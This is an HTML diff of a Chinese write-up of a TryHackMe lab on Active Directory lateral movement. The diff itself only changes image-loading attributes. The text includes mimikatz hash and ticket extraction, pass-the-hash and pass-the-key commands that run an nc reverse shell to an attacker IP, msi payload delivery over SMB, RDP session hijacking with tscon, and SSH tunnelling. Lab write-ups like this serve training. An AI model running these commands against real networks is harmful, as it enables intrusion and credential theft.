-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216122007744.png" alt="image-20240216122007744"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216122007744.png" alt="image-20240216122007744"></p>
 <p>注意：请记住，由于您将 <code>runas</code> 与 <code>/netonly</code> 选项一起使用，因此不会费心检查所提供的凭据是否有效（有关此的更多信息，请参阅枚举 AD 室），因此请务必正确输入密码。如果不这样做，您稍后会在房间中看到一些 ACCESS DENIED 错误。</p>
 <p>我们可以像往常一样在 AttackBox 中使用 nc 接收反向 shell 连接：</p>
 <pre><code class="hljs scss">nc -lvnp <span class="hljs-number">6666</span></code></pre>
@@ -283,8 +359,8 @@ msf6 exploit(multi/handler) &gt; exploit
 C:\&gt; sc.exe \\thmiis.za.tryhackme.com start THMservice-bcx</code></pre>
 <p>请务必更改您的服务名称，以避免与其他学生发生冲突。</p>
 <p>启动该服务后，您应该会在 AttackBox 中收到一个连接，您可以从该连接访问 t1_leonard.summers 桌面上的第一个标志。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216123451462.png" alt="image-20240216123451462"></p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216123458246.png" alt="image-20240216123458246"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216123451462.png" alt="image-20240216123451462"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216123458246.png" alt="image-20240216123458246"></p>
 <h1 id="0x04-使用-wmi-横向移动">0x04 使用 WMI 横向移动</h1>
 <p>我们还可以使用 Windows Management Instrumentation (WMI) 以不同的方式执行上一个任务中讨论的许多技术。 WMI 是基于 Web 的企业管理 (WBEM) 的 Windows 实现，WBEM 是跨设备访问管理信息的企业标准。</p>
 <p>简单来说，WMI 允许管理员执行标准管理任务，攻击者可以滥用这些任务以各种方式执行横向移动，我们将对此进行讨论。</p>
@@ -392,7 +468,7 @@ StartMode = <span class="hljs-string">"Manual"</span>
 <p>然后，我们使用 SMB 或任何其他可用的方法复制有效负载：</p>
 <pre><code class="hljs scss">smbclient -c 'put bcxinstaller<span class="hljs-selector-class">.msi</span>' -U t1_corine<span class="hljs-selector-class">.waters</span> -W ZA '<span class="hljs-comment">//thmiis.za.tryhackme.com/admin$/' Korine.1994</span></code></pre>
 <p>由于我们将有效负载复制到 ADMIN$ 共享，因此它将在服务器上的 C:\Windows\ 中可用。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216140108272.png" alt="image-20240216140108272"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216140108272.png" alt="image-20240216140108272"></p>
 <p>我们启动一个处理程序来接收来自 Metasploit 的反向 shell：</p>
 <pre><code class="hljs scss">msf6 <span class="hljs-built_in">exploit</span>(multi/handler) &gt; set LHOST <span class="hljs-number">10.50</span><span class="hljs-selector-class">.46</span><span class="hljs-selector-class">.236</span>
 msf6 <span class="hljs-built_in">exploit</span>(multi/handler) &gt; set LPORT <span class="hljs-number">5555</span>
@@ -417,7 +493,7 @@ PS C:\&gt; <span class="hljs-variable">$Session</span> = New-Cimsession -Compute
 <p>注意：在此任务中，假定您熟悉从主机提取凭据的方法和工具。 Mimikatz 将被用作整个房间中凭证提取的首选工具。</p>
 <h2 id="ntlm认证">NTLM认证</h2>
 <p>在深入研究实际的横向移动技术之前，我们先看一下 NTLM 身份验证的工作原理：</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216145026235.png" alt="image-20240216145026235"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216145026235.png" alt="image-20240216145026235"></p>
 <ol>
 <li>客户端向他们想要访问的服务器发送身份验证请求。</li>
 <li>服务器生成一个随机数并将其作为质询发送给客户端。</li>
@@ -484,18 +560,18 @@ mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:<span 
 <p>请注意，TGT 使用 krbtgt 帐户的密码哈希进行加密，因此用户无法访问其内容。重要的是要知道加密的 TGT 包括会话密钥的副本作为其内容的一部分，并且 KDC 不需要存储会话密钥，因为它可以在需要时通过解密 TGT 来恢复副本。</p>
 </li>
 </ol>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150118868.png" alt="image-20240216150118868"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150118868.png" alt="image-20240216150118868"></p>
 <ol start="2">
 <li>
 <p>当用户想要连接到网络上的服务（例如共享、网站或数据库）时，他们将使用 TGT 向 KDC 请求票证授予服务 (TGS)。 TGS 是只允许连接到为其创建的特定服务的票证。要请求 TGS，用户将发送他的用户名和使用会话密钥加密的时间戳，以及 TGT 和服务主体名称 (SPN)，该名称指示我们打算访问的服务和服务器名称。</p>
 <p>因此，KDC 将向我们发送 TGS 和服务会话密钥，我们需要对我们想要访问的服务进行身份验证。 TGS 使用服务所有者哈希进行加密。服务所有者是运行服务的用户或计算机帐户。 TGS 在其加密内容上包含服务会话密钥的副本，以便服务所有者可以通过解密 TGS 来访问它。</p>
 </li>
 </ol>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150256426.png" alt="image-20240216150256426"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150256426.png" alt="image-20240216150256426"></p>
 <ol start="3">
 <li>然后可以将 TGS 发送到所需的服务以进行身份验证并建立连接。该服务将使用其配置的帐户的密码哈希来解密 TGS 并验证服务会话密钥。</li>
 </ol>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150326439.png" alt="image-20240216150326439"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150326439.png" alt="image-20240216150326439"></p>
 <h2 id="传票">传票</h2>
 <p>有时可以使用 mimikatz 从 LSASS 内存中提取 Kerberos 票证和会话密钥。该过程通常需要我们在被攻击的机器上拥有 SYSTEM 权限，可以按如下方式完成：</p>
 <pre><code class="hljs scss">mimikatz # privilege::debug
@@ -554,12 +630,12 @@ mimikatz # sekurlsa::ekeys</code></pre>
 token::elevate
 lsadump::sam或者sekurlsa::msv //我使用的后者</code></pre>
 <p>接着找到目标用户<code>t1_toby.beck</code>对应的hash值，如下图所示</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216162531192.png" alt="image-20240216162531192"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216162531192.png" alt="image-20240216162531192"></p>
 <p>然后，我们可以使用提取的哈希值来执行 PtH 攻击，方法是使用 mimikatz 在反向 shell（或您喜欢的任何其他命令）上为受害者用户注入访问令牌，如下所示：</p>
 <pre><code class="hljs scss">mimikatz # token::revert
 mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:<span class="hljs-number">533</span>f1bd576caa912bdb9da284bbc60fe /run:<span class="hljs-string">"c:\tools\nc64.exe -e cmd.exe 10.50.46.236 5555"</span></code></pre>
 <p>请注意，我们使用 <code>token::revert</code> 来重新建立原始令牌权限，因为尝试使用提升的令牌传递哈希将不起作用。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216162901279.png" alt="image-20240216162901279"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216162901279.png" alt="image-20240216162901279"></p>
 <p>成功拿到shell，接着执行如下命令：</p>
 <p>一旦您的命令提示符已加载其凭据，请使用 <code>winrs</code> 连接到 THMIIS 上的命令提示符。由于任何攻击都已将 t1_toby.beck 的凭据注入到您的会话中，因此您可以使用 winrs 而不指定任何凭据，并且它将使用当前会话可用的凭据：</p>
 <pre><code class="hljs scss">winrs<span class="hljs-selector-class">.exe</span> -r:THMIIS.za.tryhackme.com cmd</code></pre>
@@ -569,18 +645,18 @@ mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:<span
 <pre><code class="hljs scss">privilege::debug
 sekurlsa::tickets /export</code></pre>
 <p>请注意，如果我们只能访问票证而不能访问其相应的会话密钥，则我们将无法使用该票证；因此，两者都是必要的。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163656590.png" alt="image-20240216163656590"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163656590.png" alt="image-20240216163656590"></p>
 <p>如上图，我们获取到了目标用户的TGT票证。</p>
 <p>一旦我们提取了所需的票证，我们就可以使用以下命令将票证注入当前会话：</p>
 <pre><code class="hljs scss">mimikatz # kerberos::ptt [<span class="hljs-number">0</span>;cd6dd]-<span class="hljs-number">2</span>-<span class="hljs-number">0</span>-<span class="hljs-number">40</span>e10000-t1_toby<span class="hljs-selector-class">.beck</span><span class="hljs-keyword">@krbtgt-ZA</span>.TRYHACKME.COM.kirbi</code></pre>
 <p>在我们自己的会话中注入票证不需要管理员权限。此后，我们用于横向移动的任何工具都可以使用门票。要检查票证是否已正确注入，您可以使用 klist 命令：</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163752957.png" alt="image-20240216163752957"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163752957.png" alt="image-20240216163752957"></p>
 <p>可以看到我们成功注入会话，成功进入目标用户的shell</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163905893.png" alt="image-20240216163905893"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163905893.png" alt="image-20240216163905893"></p>
 <h3 id="pass-the-key">Pass-the-Key</h3>
 <pre><code class="hljs scss">privilege::debug
 sekurlsa::ekeys</code></pre>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216164334193.png" alt="image-20240216164334193"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216164334193.png" alt="image-20240216164334193"></p>
 <p>可以看到目标用户可以使用aes256算法以及rc4，这里就用aes256了</p>
 <pre><code class="hljs scss">sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /aes256:<span class="hljs-number">6</span>a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e /run:<span class="hljs-string">"c:\tools\nc64.exe -e cmd.exe 10.50.46.236 5555"</span></code></pre>
 <p>这里也是成功拿到shell，不过恰好靶机重置了，没截到图，这里就算了</p>
@@ -589,7 +665,7 @@ sekurlsa::ekeys</code></pre>
 <h2 id="滥用可写股份">滥用可写股份</h2>
 <p>在检查公司环境时，经常会发现合法用户用来执行日常任务的网络共享。如果这些共享由于某种原因是可写的，攻击者就可以植入特定文件来强制用户执行任意有效负载并获得对其计算机的访问权限。</p>
 <p>一种常见的情况是查找网络共享上托管的脚本或可执行文件的快捷方式。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216165339194.png" alt="image-20240216165339194"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216165339194.png" alt="image-20240216165339194"></p>
 <p>其背后的基本原理是，管理员可以在网络共享上维护可执行文件，并且用户可以执行它，而无需将应用程序复制或安装到每个用户的计算机上。如果我们作为攻击者拥有对此类脚本或可执行文件的写入权限，我们就可以对它们进行后门以强迫用户执行我们想要的任何有效负载。</p>
 <p>尽管脚本或可执行文件托管在服务器上，但当用户在其工作站上打开快捷方式时，可执行文件将从服务器复制到其 <code>%temp%</code> 文件夹并在工作站上执行。因此，任何有效负载都将在最终用户工作站（和登录用户帐户）的上下文中运行。</p>
 <h3 id="后门-vbs-脚本">后门 .vbs 脚本</h3>
@@ -603,7 +679,7 @@ sekurlsa::ekeys</code></pre>
 <h3 id="rdp劫持">RDP劫持</h3>
 <p>当管理员使用远程桌面连接到计算机并关闭 RDP 客户端而不是注销时，他的会话将无限期地在服务器上保持打开状态。如果您在 Windows Server 2016 及更早版本上拥有系统权限，则无需密码即可接管任何现有 RDP 会话。</p>
 <p>如果我们有管理员级别的访问权限，我们可以通过我们喜欢的任何方法获取 SYSTEM。现在，我们将使用 psexec 来执行此操作。首先，让我们以管理员身份运行 cmd.exe：</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216165820771.png" alt="image-20240216165820771"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216165820771.png" alt="image-20240216165820771"></p>
 <p>从那里运行 <code>PsExec64.exe</code> （可在 <code>C:\tools\</code> 处获取）：</p>
 <pre><code class="hljs scss">PsExec64<span class="hljs-selector-class">.exe</span> -s cmd<span class="hljs-selector-class">.exe</span></code></pre>
 <p>要列出服务器上现有的会话，可以使用以下命令：</p>
@@ -628,19 +704,19 @@ sekurlsa::ekeys</code></pre>
 <pre><code class="hljs scss">PsExec64<span class="hljs-selector-class">.exe</span> -s cmd<span class="hljs-selector-class">.exe</span></code></pre>
 <p>接着列出服务器上所有的会话：</p>
 <pre><code class="hljs scss">query user</code></pre>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216202509233.png" alt="image-20240216202509233"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216202509233.png" alt="image-20240216202509233"></p>
 <p>要连接到会话，我们将使用 tscon.exe 并指定我们将接管的会话 ID，以及当前的 SESSIONNAME。按照前面的示例，如果我们以管理员用户身份连接，要接管 luke 的会话，我们将使用以下命令：</p>
 <pre><code class="hljs scss">tscon <span class="hljs-number">4</span> /dest:rdp-tcp#<span class="hljs-number">27</span></code></pre>
 <p>简单来说，该命令指出<code> t1_toby.beck</code> 拥有的图形会话 <code>4</code> 应与管理员用户拥有的 RDP 会话 <code>rdp-tcp#27</code> 连接。</p>
 <p>如下图成功窃取到会话</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216202415931.png" alt="image-20240216202415931"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216202415931.png" alt="image-20240216202415931"></p>
 <h1 id="0x07-端口转发">0x07 端口转发</h1>
 <p>我们提出的大多数横向移动技术都需要特定端口可供攻击者使用。在现实网络中，管理员可能出于安全原因阻止了其中一些端口，或者在网络周围实施了分段，从而阻止您访问 SMB、RDP、WinRM 或 RPC 端口。</p>
 <p>为了绕过这些限制，我们可以使用端口转发技术，其中包括使用任何受感染的主机作为跳转盒来转向其他主机。预计某些机器将比其他机器拥有更多的网络权限，因为企业中的每个角色在日常工作所需的网络服务方面都有不同的需求。</p>
 <h2 id="ssh-隧道">SSH 隧道</h2>
 <p>我们要研究的第一个协议是 SSH，因为它已经具有通过称为 SSH 隧道的功能进行端口转发的内置功能。虽然 SSH 曾经是与 Linux 系统相关的协议，但 Windows 现在默认附带 OpenSSH 客户端，因此您可以在当今的许多系统中找到它，而与操作系统无关。</p>
 <p>SSH 隧道可以以不同的方式使用，通过 SSH 连接转发端口，我们将根据情况使用它。为了解释每种情况，我们假设一个场景，我们已经获得了对 PC-1 机器的控制权（不需要管理员访问权限），并且希望将其用作访问另一台机器上的端口的枢纽。我们无法直接连接。我们将启动一条从 PC-1 计算机（充当 SSH 客户端）到攻击者 PC（充当 SSH 服务器）的隧道。这样做的原因是，您经常会在 Windows 计算机上找到 SSH 客户端，但大多数时候没有可用的 SSH 服务器。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216203013265.png" alt="image-20240216203013265"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216203013265.png" alt="image-20240216203013265"></p>
 <p>由于我们将连接回攻击者的计算机，因此我们希望在其中创建一个用户，而无需访问任何隧道控制台，并设置用于创建隧道的密码：</p>
 <pre><code class="hljs scss">useradd tunneluser -m -d /home/tunneluser -s /bin/true
 passwd tunneluser</code></pre>
@@ -648,7 +724,7 @@ passwd tunneluser</code></pre>
 <h2 id="ssh-远程端口转发">SSH 远程端口转发</h2>
 <p>在我们的示例中，假设防火墙策略阻止攻击者的计算机直接访问服务器上的端口 3389。如果攻击者之前已入侵 PC-1，并且 PC-1 可以访问服务器的端口 3389，则可以使用 PC-1 的远程端口转发将其转移到端口 3389。远程端口转发允许您从 SSH 客户端（在本例中为 PC-1）获取可访问的端口，并将其投射到远程 SSH 服务器（攻击者的计算机）中。</p>
 <p>结果，攻击者的计算机上将打开一个端口，可用于通过 SSH 隧道连接回服务器中的端口 3389。反过来，PC-1 将代理连接，以便服务器将看到所有流量，就好像它来自 PC-1 一样：</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216203227640.png" alt="image-20240216203227640"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216203227640.png" alt="image-20240216203227640"></p>
